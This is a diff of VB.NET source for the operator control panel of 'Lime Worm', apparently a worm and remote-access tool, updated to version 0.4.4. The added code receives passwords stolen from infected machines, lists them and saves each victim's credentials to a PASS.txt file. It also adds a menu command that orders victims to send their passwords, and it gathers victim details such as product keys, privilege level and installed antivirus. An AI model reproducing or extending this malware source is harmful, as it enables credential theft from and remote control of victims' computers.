@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./26/2018        ##
+'##        N Y A N   C A T  |||   Updated on Apr./08/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.4.3 ..                   ##
+'##                     .. Lime Worm v0.4.4 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -71,7 +71,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.4.3"
+        Me.Text = "Lime Worm v0.4.4"
 
         Try
             If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
@@ -92,6 +92,8 @@ Public Class Form1
         PATH1.Enabled = False
         DROP.Checked = False
         PATH2.Enabled = False
+
+        PORT.Text = MYPORT
 
     End Sub
 #End Region
@@ -201,54 +203,6 @@ Public Class Form1
                         Cap.PktToImage(BB)
                     End If
 
-                Case "Details"
-                    If Me.InvokeRequired Then
-                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
-                        Exit Sub
-                    End If
-
-                    Dim D As Details = My.Application.OpenForms("D" + u.IP)
-                    If D Is Nothing Then
-                        D = New Details
-                        D.F = Me
-                        D.U = u
-                        D.Name = "D" + u.IP
-                        D.Text = "Details " + u.IP.Split(":")(0)
-                        D.Show()
-                    End If
-
-                    D.TreeView1.Nodes(0).Nodes(0).Text = "Computer Name: " & A(1)
-                    D.TreeView1.Nodes(0).Nodes(1).Text = "User Name: " & A(2)
-                    D.TreeView1.Nodes(0).Nodes(2).Text = "Virtual Screen Width: " & A(3)
-                    D.TreeView1.Nodes(0).Nodes(3).Text = "Virtual Screen Height: " & A(4)
-                    D.TreeView1.Nodes(0).Nodes(4).Text = "Available Physical Memory: " & A(5)
-                    D.TreeView1.Nodes(0).Nodes(5).Text = "Available Virtual Memory: " & A(6)
-                    D.TreeView1.Nodes(0).Nodes(6).Text = "OS Full Name: " & A(7)
-                    D.TreeView1.Nodes(0).Nodes(7).Text = "OS Platform: " & A(8)
-                    D.TreeView1.Nodes(0).Nodes(8).Text = "OS Version: " & A(9)
-                    D.TreeView1.Nodes(0).Nodes(9).Text = "Total Physical Memory: " & A(10)
-                    D.TreeView1.Nodes(0).Nodes(10).Text = "Total Virtual Memory: " & A(11)
-                    D.TreeView1.Nodes(0).Nodes(11).Text = "Battery Charge Status: " & A(12)
-                    D.TreeView1.Nodes(0).Nodes(12).Text = "Battery Full Lifetime: " & A(13)
-                    D.TreeView1.Nodes(0).Nodes(13).Text = "Battery Life Percent: " & A(14)
-                    D.TreeView1.Nodes(0).Nodes(14).Text = "Battery Life Remaining: " & A(15)
-                    D.TreeView1.Nodes(0).Nodes(15).Text = "CPU Info: " & A(16)
-                    D.TreeView1.Nodes(0).Nodes(16).Text = "GPU Name: " & A(17)
-                    D.TreeView1.Nodes(0).Nodes(17).Text = "Uptime: " & A(18)
-                    D.TreeView1.Nodes(1).Nodes(0).Text = "Registered Owner: " & A(19)
-                    D.TreeView1.Nodes(1).Nodes(1).Text = "Registered Organization: " & A(20)
-                    D.TreeView1.Nodes(1).Nodes(2).Text = "Product Key: " & A(21)
-
-                    Dim s As String = A(22)
-                    For i = 2 To s.Length + 2 Step 3
-                        s = s.Insert(i, ":")
-                    Next
-
-                    D.TreeView1.Nodes(1).Nodes(3).Text = "MAC Adress: " & s
-                    D.TreeView1.Nodes(1).Nodes(4).Text = "Installed AntiVirus Engine: " & A(23)
-                    D.TreeView1.Nodes(1).Nodes(5).Text = "Worm Location: " & A(24)
-
-
                 Case "MSG"
                     Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)
 
@@ -353,6 +307,107 @@ Public Class Form1
                         Next
                     End If
 
+                Case "PWD+"
+
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim P As PWD = My.Application.OpenForms("PWD")
+                    If P Is Nothing Then
+                        P = New PWD
+                        P.F = Me
+                        P.U = u
+                        P.Name = "PWD"
+                        P.Text = " Passwords"
+                        P.Show()
+                    End If
+
+                    'duplicate 
+                    For Each listItem As ListViewItem In P.ListView1.Items
+                        If listItem.SubItems.Item(0).Text.Contains(A(2).ToString) Then
+                            Exit Select
+                        End If
+                    Next
+
+                    Dim aa As String() = Split(A(1), "~|~")
+                    For i = 2 To aa.Length
+                            Dim ii As New ListViewItem
+                            ii.Text = aa(i)
+                            ii.SubItems.Add(aa(i + 2))
+                            ii.SubItems.Add(aa(i + 4))
+                            ii.SubItems.Add(aa(i + 6))
+                            ii.SubItems.Add(aa(i + 8))
+                            P.ListView1.Items.Add(ii)
+                            i += 9
+                        Next
+
+                    If Not IO.Directory.Exists("Users" + "\" + A(2).ToString) Then
+                        IO.Directory.CreateDirectory("Users" + "\" + A(2).ToString)
+                    End If
+                    IO.File.WriteAllText("Users" + "\" + A(2).ToString + "\" + "PASS.txt", A(1))
+
+                Case "Info"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim n As Info = My.Application.OpenForms("Info" + u.IP)
+                    If n Is Nothing Then
+                        n = New Info
+                        n.F = Me
+                        n.U = u
+                        n.Name = "Info" + u.IP
+                        n.Text = "Info " + u.IP.Split(":")(0)
+                        n.Show()
+                    End If
+                    n.ListView1.Clear()
+                    n.ListView1.FullRowSelect = True
+                    n.ListView1.View = View.Details
+                    n.ListView1.Columns.Add("")
+                    n.ListView1.Columns.Add("")
+                    n.ListView1.HeaderStyle = ColumnHeaderStyle.None
+
+                    Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
+                    Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
+                    Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
+                    Dim GL As New ListViewGroup("Worm", HorizontalAlignment.Left)
+                    Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)
+
+                    n.ListView1.Groups.Add(GU)
+                    n.ListView1.Groups.Add(GW)
+                    n.ListView1.Groups.Add(GS)
+                    n.ListView1.Groups.Add(GL)
+                    n.ListView1.Groups.Add(GM)
+
+                    n.ListView1.Items.Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))
+                    n.ListView1.Items.Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
+                    n.ListView1.Items.Add(New ListViewItem("Privilege: ", GU)).SubItems.Add(A(3))
+
+
+                    n.ListView1.Items.Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
+                    n.ListView1.Items.Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(6))
+                    n.ListView1.Items.Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(5))
+                    n.ListView1.Items.Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))
+
+                    n.ListView1.Items.Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
+                    n.ListView1.Items.Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
+                    n.ListView1.Items.Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
+                    n.ListView1.Items.Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
+                    n.ListView1.Items.Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
+
+
+                    n.ListView1.Items.Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
+                    n.ListView1.Items.Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
+                    n.ListView1.Items.Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))
+
+                    n.ListView1.Items.Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
+                    n.ListView1.Items.Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
+                    n.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+
+
             End Select
         Catch ex As Exception
             MsgBox(ex.Message)
@@ -453,6 +508,70 @@ Public Class Form1
 
 
 #Region "Theme"
+
+
+
+    Class ListViewComparer
+        Implements IComparer
+
+        Private m_ColumnNumber As Integer
+        Private m_SortOrder As SortOrder
+
+        Public Sub New(ByVal column_number As Integer, ByVal _
+            sort_order As SortOrder)
+            m_ColumnNumber = column_number
+            m_SortOrder = sort_order
+        End Sub
+
+        ' Compare the items in the appropriate column
+        ' for objects x and y.
+        Public Function Compare(ByVal x As Object, ByVal y As _
+            Object) As Integer Implements _
+            System.Collections.IComparer.Compare
+            Dim item_x As ListViewItem = DirectCast(x,
+                ListViewItem)
+            Dim item_y As ListViewItem = DirectCast(y,
+                ListViewItem)
+
+            ' Get the sub-item values.
+            Dim string_x As String
+            If item_x.SubItems.Count <= m_ColumnNumber Then
+                string_x = ""
+            Else
+                string_x = item_x.SubItems(m_ColumnNumber).Text
+            End If
+
+            Dim string_y As String
+            If item_y.SubItems.Count <= m_ColumnNumber Then
+                string_y = ""
+            Else
+                string_y = item_y.SubItems(m_ColumnNumber).Text
+            End If
+
+            ' Compare them.
+            If m_SortOrder = SortOrder.Ascending Then
+                If IsNumeric(string_x) And IsNumeric(string_y) _
+                    Then
+                    Return Val(string_x).CompareTo(Val(string_y))
+                ElseIf IsDate(string_x) And IsDate(string_y) _
+                    Then
+                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
+                Else
+                    Return String.Compare(string_x, string_y)
+                End If
+            Else
+                If IsNumeric(string_x) And IsNumeric(string_y) _
+                    Then
+                    Return Val(string_y).CompareTo(Val(string_x))
+                ElseIf IsDate(string_x) And IsDate(string_y) _
+                    Then
+                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
+                Else
+                    Return String.Compare(string_y, string_x)
+                End If
+            End If
+        End Function
+    End Class
 
     Private Sub Fix()
         On Error Resume Next
@@ -659,7 +778,7 @@ Public Class Form1
 
     Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Details")
+            S.Send(x.Tag, "Info")
         Next
     End Sub
 
@@ -679,7 +798,6 @@ Public Class Form1
             Next
         End If
     End Sub
-
 
     Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
@@ -704,6 +822,14 @@ Public Class Form1
             S.Send(x.Tag, "OFM")
         Next
     End Sub
+
+    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "PWD")
+        Next
+
+    End Sub
+
 #End Region
 
 
@@ -724,6 +850,10 @@ Public Class Form1
 
         If (PATH2.Text = "") Then
             PATH2.Text = Nothing
+        End If
+
+        If (HOST1.Text = HOST2.Text) Then
+            HOST2.Text = String.Empty
         End If
 
         If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
@@ -810,6 +940,8 @@ Public Class Form1
             PATH2.Enabled = False
         End If
     End Sub
+
+
 
 
 #End Region
